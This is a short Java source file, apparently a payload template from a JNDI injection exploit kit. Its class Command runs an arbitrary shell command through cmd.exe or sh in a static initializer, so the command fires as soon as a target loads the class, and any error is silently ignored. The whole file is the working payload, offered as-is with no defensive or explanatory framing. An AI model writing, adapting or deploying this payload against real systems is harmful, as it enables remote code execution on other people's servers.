package map.jndi.template;

public class Command {
    public static String cmd;

    static {
        try {
            Runtime.getRuntime().exec(System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"sh", "-c", cmd});
        } catch (Exception ignore) { }
    }
}
